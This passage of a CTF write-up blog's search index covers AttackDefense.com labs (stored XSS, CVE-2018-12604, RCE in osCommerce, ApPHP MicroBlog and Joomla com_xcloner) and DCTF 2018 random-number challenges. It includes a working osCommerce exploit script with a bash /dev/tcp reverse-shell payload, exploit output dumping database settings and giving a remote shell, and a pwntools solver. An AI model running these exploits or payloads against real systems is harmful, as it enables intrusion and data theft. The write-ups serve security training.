the following examples of XSS payloads. http://udxkg51hwj61dpkifm62lkdu9.public2.attackdefenselabs.com/index.php?page=posts&amp;post_id=69With a simple refresh I have obtained the following result:" }, { "title": "AttackDefense.com [SXSS] - Easy Appointments", "url": "/nitesculucian.github.io/2018/10/27/attackdefense-com-sxss-easy-appointments/", "categories": "AttackDefense.com, writeups", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-27 22:40:00 +0300", "snippet": "MissionA version of Easy Appointments is vulnerable to stored cross site scripting attack. This application is vulnerable to multiple reflected and stored XSS vulnerabilities. Your task is to find ...", "content": "MissionA version of Easy Appointments is vulnerable to stored cross site scripting attack. This application is vulnerable to multiple reflected and stored XSS vulnerabilities. Your task is to find and exploit them.The following username and password may be used to explore the application and create regular users if required to exploit authenticated access vulnerabilities: User: admin Password: passwordLevel difficulty: EasyCategory: Real World Webapps &gt; Stored XSSSolutionAt first, I was prompted straight to the application “Backed Section” at http://75dux4a6duu9d9ikl8elrdxsc.public1.attackdefenselabs.com/easyappointments/index.php/user/login.By trimming the given URL of the application, I found the following valid path: http://75dux4a6duu9d9ikl8elrdxsc.public1.attackdefenselabs.com/easyappointments/index.phpI discovered, by filling the public available form, that on step 3 it is the best place to inject my JavaScript payloads in order to achieve a Stored XSS Exploit.After that, I received an appointment confirmation with a safe and escaped (at least for the user) output of my payloads.Here my payloads are already saved in the database of the application with no error (SQL Injection Vulnerabilities, restricted format or characters).Using the provided credentials on http://75dux4a6duu9d9ikl8elrdxsc.public1.attackdefenselabs.com/easyappointments/index.php/user/login page we obtain access to the admin interface where you can observe the followings:By clicking on the 29 October 2018 appointment (my appointment), we will execute two different payloads that can be linked back to our inputs.With the above example and not just in this scenario, an attacker can compromise the session of the admin user in order to obtain access to the application backend." }, { "title": "AttackDefense.com [ID] - CVE-2018-12604 Exploit", "url": "/nitesculucian.github.io/2018/10/26/attackdefense-com-id-cve-2018-12604-exploit/", "categories": "AttackDefense.com, writeups, CVE-2018", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-26 22:18:00 +0300", "snippet": "MissionGreenCMS is a free and open source CMS developed in PHP.GreenCMS (2.3.0603) is vulnerable to a Sensitive Information Disclosure documented in CVE-2018-12604. Your mission is to find and expl...", "content": "MissionGreenCMS is a free and open source CMS developed in PHP.GreenCMS (2.3.0603) is vulnerable to a Sensitive Information Disclosure documented in CVE-2018-12604. Your mission is to find and exploit this vulnerability. The following username and passwords may be used to explore the application and/or find a vulnerability which might require authenticated access: Username: admin Password: password1Level difficulty: EasyCategory: Webapps CVEs &gt; Remote Code ExecutionSolutionCVE-2018-12604 referse to an Information Disclosure vulnerability on GreenCMS version 2.3.0603 application. CVE-2018-12604 on CVE Mitre Initial DisclosureIn my case I was provided with the following application:Following the exploit for CVE-2018-12604 (https://www.exploit-db.com/exploits/44922/) we will obtain the following informations from the public aviable directory listing:http://w742xalcvupffryr0gyh6m9wo.public1.attackdefenselabs.com/Data/Log/http://w742xalcvupffryr0gyh6m9wo.public1.attackdefenselabs.com/Data/Log/18_07_05.loghttp://w742xalcvupffryr0gyh6m9wo.public1.attackdefenselabs.com/Data/Log/18_10_27.log" }, { "title": "AttackDefense.com [RCE] - osCommerce", "url": "/nitesculucian.github.io/2018/10/26/attackdefense-com-rce-oscommerce/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-26 19:57:00 +0300", "snippet": "MissionA version of osCommerce is vulnerable to a remote code execution attack. Exploiting this flaw does not require any valid accounts on the system. A attacker can remotely exploit the system an...", "content": "MissionA version of osCommerce is vulnerable to a remote code execution attack. Exploiting this flaw does not require any valid accounts on the system. A attacker can remotely exploit the system and run arbitrary commands on the system as the web server user.Your task is to find this vulnerability and gain remote code exploitation!Level difficulty: IntermediateCategory: Real World Webapps &gt; Remote Code ExecutionSolutionAlso, on this challenge, I got a real copy of aosCommerce application deploy, an online shop.From the previous challenge (AttackDefense.com [RCE] - ApPHP MicroBlog) I got the simplest idea of testing for installation files and folders in order to gain more information about the target.By accessing http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/ I obtain the following:Knowing the version of the application I decided to search for a publicly available exploit. I found an interesting one at this link.After taking a look at the exploit code I decided to adapt it to my needs:lucian@local:~/Downloads$ python 44374.py [+] Successfully launched the exploit. Open the following URL to execute your codehttp://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/includes/configure.phplucian@local:~/Downloads$ At this point, we got a remote code execution using a PHP Object Injection vector of attack.In order to obtain a reverse shell for this exploit you have to make a few changes to the exploit script.The exploit code will like that:# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution# Date: 29.0.3.2018# Exploit Author: Simon Scannell - https://scannell-infosec.net &lt;contact@scannell-infosec.net&gt;# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable# Tested on: Linux, Windows# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly# execute the \"install_4.php\" script, which will create the config file for the installation. It is possible to inject# PHP code into the config file and then simply executing the code by opening it.import requests# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)base_url = \"http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/\"target_url = \"http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/install.php?step=4\"data = { 'DIR_FS_DOCUMENT_ROOT': './'}# the payload will be injected into the configuration file via this code# ' define(\\'DB_DATABASE\\', \\'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\\');' . \"\\n\" .# so the format for the exploit will be: '); PAYLOAD; /*payload = '\\');'# payload += 'system(\"ls\");' # this is where you enter you PHP payloadpayload += 'system(\"bash -i &gt;&amp; /dev/tcp/&lt;Your VPS IP Address&gt;/1337 0&gt;&amp;1\");' # this is where you enter you PHP payloadpayload += '/*'data['DB_DATABASE'] = payload# exploit itr = requests.post(url=target_url, data=data)if r.status_code == 200: print(\"[+] Successfully launched the exploit. Open the following URL to execute your code\\n\\n\" + base_url + \"install/includes/configure.php\")else: print(\"[-] Exploit did not execute as planned\")" }, { "title": "AttackDefense.com [RCE] - ApPHP MicroBlog", "url": "/nitesculucian.github.io/2018/10/26/attackdefense-com-rce-apphp-microblog/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-26 18:33:00 +0300", "snippet": "MissionThis version of ApPHP MicroBlog is vulnerable to remote code execution attack. Your task is to find and exploit this vulnerability.Level difficulty: IntermediateCategory: Real World Webapps ...", "content": "MissionThis version of ApPHP MicroBlog is vulnerable to remote code execution attack. Your task is to find and exploit this vulnerability.Level difficulty: IntermediateCategory: Real World Webapps &gt; Remote Code ExecutionSolutionIn this challenge, I have a copy of a full but old version of a blog engine that later on I have discovered to be a real engine. For sure Real World Webapps category has multiple real-world applications!First I was a bit attracted to this little error:Funny enough this gave me inspiration for the next challenge (AttackDefense.com [RCE] - osCommerce) but did not help to solve this one as the install.php was nowhere to find.After a bit of manual crawling I discovered the Admin Login page as such:I also have to admit that I tried both Local and Remote File Inclusion Vulnerabilities but with no luck what so ever:Using the same password and username as in the previous challenge (AttackDefense.com [RCE] - Joomla com_xcloner Component) I obtained access on the first attempt in the blog control panel.After several attempts to execute PHP code within the already existing articles (I was thinking at template tags), I decided to search for multiple exploits for the given blog website and lucky enough I found this exploit interesting:Link: https://www.exploit-db.com/exploits/33070/Let’s run the exploit:lucian@local:~/Downloads$ python 33070.py http://t832sc6atai03njff2nqe6kov.public2.attackdefenselabs.com/index.php -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-original exploit by Jiko : http://www.exploit-db.com/exploits/33030/[*] Testing for vulnerability...[+] Website is vulnerable[*] Fecthing phpinfo\tPHP Version 5.3.10-1ubuntu3.26\tSystem Linux attackdefense.com 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64\tLoaded Configuration File /etc/php5/apache2/php.ini\tApache Version Apache/2.2.22 (Ubuntu)\tUser/Group www-data(33)/33\tServer Root /etc/apache2\tDOCUMENT_ROOT /var/www\tPHP Version 5.3.10-1ubuntu3.26\tallow_url_fopen On On\tallow_url_include Off Off\tdisable_functions pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority, pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,\topen_basedir no value no value\tsafe_mode Off Off\tsafe_mode_exec_dir no value no value\tsafe_mode_gid Off Off\tsafe_mode_include_dir no value no value\tsafe_mode_allowed_env_vars PHP_ PHP_\tsafe_mode_protected_env_vars LD_LIBRARY_PATH LD_LIBRARY_PATH[*] Fetching include/base.inc.php&lt;?php\t\t\t// DATABASE CONNECTION INFORMATION\t\t\tdefine('DATABASE_HOST', 'localhost');\t // Database host\t\t\tdefine('DATABASE_NAME', 'big');\t // Name of the database to be used\t\t\tdefine('DATABASE_USERNAME', 'root');\t// User name for access to database\t\t\tdefine('DATABASE_PASSWORD', '');\t// Password for access to database\t\t\tdefine('DB_ENCRYPT_KEY', '6hpq3545z7');\t\t// Database encryption key\t\t\tdefine('DB_PREFIX', 'mb101_');\t\t // Unique prefix of all table names in the database\t\t\t?&gt;[*] Testing remote execution[+] Remote exec is working with system() :)Submit your commands, type exit to quit&gt; lsINSTALL.txtREADME.txtadminbackupdocsfooter.phpheader.phphtmlimagesincludeindex.phpinstallinstall.phpjslicensemailspagerss.xmlstyleswysiwygAnd of course we got a terminal shell under the www-data user:" }, { "title": "AttackDefense.com [RCE] - Joomla com_xcloner Component", "url": "/nitesculucian.github.io/2018/10/26/attackdefense-com-rce-joomla-com-xcloner-component/", "categories": "AttackDefense.com, ctf, writeups, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-10-26 17:40:00 +0300", "snippet": "MissionA version of Joomla com_xcloner Component is vulnerable to remote code execution attack. Your task is to find and exploit this vulnerability.The following username and password may be used t...", "content": "MissionA version of Joomla com_xcloner Component is vulnerable to remote code execution attack. Your task is to find and exploit this vulnerability.The following username and password may be used to explore the application and create regular users if required to exploit authenticated access vulnerabilities: User: admin Password: passwordLevel difficulty: EasyCategory: Real World Webapps &gt; Remote Code ExecutionSolutionFirst I was provided with the following Joomla website:By using the username and password that were given to me at the start of this challenge, I have obtained access to the Joomla Control Panel:There I was able to discover the installed version of Joomla Core:Even if I tried multiple known remote code execution exploits for Joomla Core version 1.6.0, I was unable to get any command execution on the target website. Therefore, I took in account the following provided information:Joomla com_xcloner ComponentThis simple statement transmitted me to search on Google for exploits applicable to Joomla com_xcloner Component and to my surprise, I have obtained the following:After downloading the exploit and running it against the target website, I have obtained the following:lucian@local:~/Downloads$ python 16246.py -t ie9i8y5pobnhaf1u7vhg8egbt.public2.attackdefenselabs.com:80 -d /joomla/\t| ----------------------------------------------------------------------------- |\t| Joomla component (com_xcloner-backupandrestore) remote code execution explo!t |\t| by mr_me - net-ninja.net ---------------------------------------------------- |(+) Targeting http://ie9i8y5pobnhaf1u7vhg8egbt.public2.attackdefenselabs.com:80/joomla/(!) Exploit working!(+) Droping to remote console (q for quit)lucian@ie9i8y5pobnhaf1u7vhg8egbt.public2.attackdefenselabs.com:80# The last thing was to prove that I have finished the challenge:" }, { "title": "[DCTF Quals 2018] Even more lucky?", "url": "/nitesculucian.github.io/2018/10/07/dctf-quals-2018-even-more-lucky/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp 2018, writeups, CTF capture, flag, challange", "date": "2018-10-07 00:38:00 +0300", "snippet": "Description:We have updated the lucky game just for you! Now the executable is lighter and more efficient.Target: 167.99.143.206 65032Bin: Even more lucky binaryAuthor:Lucian NitescuStats:50 point ...", "content": "Description:We have updated the lucky game just for you! Now the executable is lighter and more efficient.Target: 167.99.143.206 65032Bin: Even more lucky binaryAuthor:Lucian NitescuStats:50 point / 119 solversSolution:On 167.99.143.206 at port 65032 we can observe the following:$ nc 167.99.143.206 65032Hello, there!What is your name?LucianI am glad to know you, Lucian!Server time: 153886If you guess the next 100 random numbers I shall give you the flag!What number am I thinking of? [0/100]1Wow that is wrong!Let’s decompile the binary in IDA and analyze its main function.__int64 __fastcall main(__int64 a1, char **a2, char **a3){ __int64 v3; // rax@1 __int64 v4; // rax@1 __int64 v5; // rax@1 __int64 v6; // rax@1 __int64 v7; // rax@1 __int64 v8; // rax@1 __int64 v9; // rax@1 __int64 v10; // rax@1 __int64 v11; // rax@1 __int64 v12; // rax@1 __int64 v13; // rax@3 __int64 v14; // rax@3 __int64 v15; // rax@3 __int64 v16; // rax@4 __int64 v17; // rax@4 __int64 v18; // rax@5 signed int v19; // ebx@5 __int64 v20; // rax@7 char v22; // [sp+0h] [bp-330h]@6 char v23; // [sp+210h] [bp-120h]@1 char v24; // [sp+2A0h] [bp-90h]@1 char v25; // [sp+2C0h] [bp-70h]@1 char v26; // [sp+2E0h] [bp-50h]@1 int v27; // [sp+310h] [bp-20h]@3 int v28; // [sp+314h] [bp-1Ch]@3 int v29; // [sp+318h] [bp-18h]@1 unsigned int i; // [sp+31Ch] [bp-14h]@1 v29 = time(0LL); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v25, a2); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v24, a2); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v23, a2); srand(v29 / 10); LODWORD(v3) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Hello, there!\"); LODWORD(v4) = std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v5) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What is your name?\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v23); sub_2033(&amp;v26, v29 / 10000); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;v25, &amp;v26); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v26); LODWORD(v6) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"I am glad to know you, \"); LODWORD(v7) = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v6, &amp;v23); LODWORD(v8) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v7, \"!\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v9) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Server time: \"); LODWORD(v10) = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v9, &amp;v25); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v11) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( &amp;std::cout, \"If you guess the next 100 random numbers I shall give you the flag!\"); LODWORD(v12) = std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); for ( i = 0; (signed int)i &lt;= 99; ++i ) { v28 = rand(); LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What number am I thinking of? [\"); LODWORD(v14) = std::ostream::operator&lt;&lt;(v13, i); LODWORD(v15) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v14, \"/100]\"); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v23); v27 = sub_1FE9(&amp;v23, 0LL, 10LL); if ( v27 != v28 ) { LODWORD(v18) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is wrong!\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v19 = -1; goto LABEL_9; } LODWORD(v16) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wow that is corect!\"); LODWORD(v17) = std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::basic_ifstream(&amp;v22, \"./flag2\", 8LL); if ( (unsigned __int8)std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::is_open(&amp;v22) ) { std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v22, &amp;v24); LODWORD(v20) = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cout, &amp;v24); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::close(&amp;v22); } v19 = 0; std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::~basic_ifstream(&amp;v22);LABEL_9: std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v23); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v24); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v25); return (unsigned int)v19;}This time the seed fed into srand() is time(NULL) / 10. The C library function time_t time(time_t *seconds) returns the time since the Epoch (00:00:00 UTC, January 1, 1970), measured in seconds. If seconds is not NULL, the return value is also stored in variable seconds. We can use the current system time output in order to exploit the vulnerability.Get the seed value and the random numbers with:#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv){ int seed = atoi(argv[1]); srand(seed); for(int i = 0; i &lt; 100; i++){ printf(\"%d\\n\", rand()); }}Final step using the above compiled (in a.out) source code:#!/usr/bin/pythonfrom pwn import *import timeimport oshost = '167.99.143.206'port = 65032r = remote(host, port)x = time.time()r.recvuntil('?')r.sendline('a')os.system('./a.out ' + str(x // 10) + ' &gt; see')f = open('see', 'r')x = f.read().split('\\n')[:-1]for i in range(100): r.recvuntil(']') r.sendline(str(x[i])) print (i)r.interactive()Result:$ python 2.py [+] Opening connection to 167.99.143.206 on port 65032: Done012345678910.. sniiiiiip9596979899[*] Switching to interactive modeWow that is corect!DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace}[*] Got EOF while reading in interactiveThe flag was: DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace}" }, { "title": "[DCTF Quals 2018] Lucky", "url": "/nitesculucian.github.io/2018/10/06/dctf-quals-2018-lucky/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2018, writeups, CTF, challange", "date": "2018-10-06 22:52:00 +0300", "snippet": "Description:How lucky are you?Target: 167.99.143.206 65031Bin: Lucky BinaryAuthor:Lucian NitescuStats:50 point / 139 solversSolution:On 167.99.143.206 at port 65031 we can observe the following:$ n...", "content": "Description:How lucky are you?Target: 167.99.143.206 65031Bin: Lucky BinaryAuthor:Lucian NitescuStats:50 point / 139 solversSolution:On 167.99.143.206 at port 65031 we can observe the following:$ nc 167.99.143.206 65031 Hello, there!What is your name?LucianI am glad to know you, Lucian!If you guess the next 100 random numbers I shall give you the flag!What number am I thinking of? [0/100]1Wow that is wrong!$ Using the provided binary file we can send a long string as name and obtain a buffer overflow error (Segmentation fault (core dumped)):$ ./lucky Hello, there!What is your nameam glad to know you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!If you guess the next 100 random numbers I shall give you the flag!What number am I thinking of? [0/100]1Wow that is wrong!Segmentation fault (core dumped)Let’s decompile the binary in IDA and analyze its main function.__int64 __fastcall main(__int64 a1, char **a2, char **a3){ int v3; // eax@1 unsigned int *v4; // rsi@2 __int64 v5; // rax@4 __int64 v6; // rax@6 __int64 v7; // rax@7 __int64 v8; // rax@7 __int64 v9; // rax@7 const char *v10; // rax@7 __int64 v11; // rax@7 __int64 v12; // rax@7 __int64 v13; // rax@7 __int64 v14; // rax@7 __int64 v15; // rax@7 __int64 v16; // rax@9 __int64 v17; // rax@9 __int64 v18; // rax@9 __int64 v19; // rax@10 __int64 v20; // rax@10 __int64 v21; // rax@11 signed int v22; // ebx@11 __int64 v23; // rax@13 char v25; // [sp+0h] [bp-540h]@12 char v26; // [sp+210h] [bp-330h]@12 char v27; // [sp+240h] [bp-300h]@7 char dest; // [sp+260h] [bp-2E0h]@7 char v29; // [sp+2D0h] [bp-270h]@7 char v30; // [sp+2F0h] [bp-250h]@1 __int64 v31; // [sp+3F0h] [bp-150h]@1 unsigned int seed[2]; // [sp+4F8h] [bp-48h]@1 int v33; // [sp+514h] [bp-2Ch]@9 int v34; // [sp+518h] [bp-28h]@9 unsigned int v35; // [sp+51Ch] [bp-24h]@7 __int64 v36; // [sp+520h] [bp-20h]@1 unsigned int i; // [sp+52Ch] [bp-14h]@7 *(_QWORD *)seed = 0LL; v36 = 8LL; v3 = sub_1972(8LL, 4LL, a3); std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::basic_ifstream(&amp;v30, \"/dev/urandom\", (unsigned int)v3); if ( (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::operator bool(&amp;v31) ) { v4 = seed; std::istream::read((std::istream *)&amp;v30, (char *)seed, v36); if ( (unsigned __int8)std::basic_ios&lt;char,std::char_traits&lt;char&gt;&gt;::operator bool(&amp;v31) ) { srand(seed[0]); } else { LODWORD(v5) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, \"Failed to read from /dev/urandom\"); v4 = (unsigned int *)&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;; std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } std::basic_ifstream&lt;char,std::char_traits&lt;char&gt;&gt;::close(&amp;v30, v4); } else { LODWORD(v6) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, \"Failed to open /dev/urandom\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); } v35 = rand(); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v29); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v27); LODWORD(v7) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Hello, there!\"); LODWORD(v8) = std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v9) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"What is your name?\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v27); LODWORD(v10) = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::c_str(&amp;v27); strcpy(&amp;dest, v10); srand(v35); LODWORD(v11) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"I am glad to know you, \"); LODWORD(v12) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v11, &amp;dest); LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v12, \"!\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); LODWORD(v14) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( &amp;std::cout, \"If you guess the next 100 random numbers I shall give you the flag!\"); LODWORD(v15) = std::ostream::operator&lt;&lt;(v14, 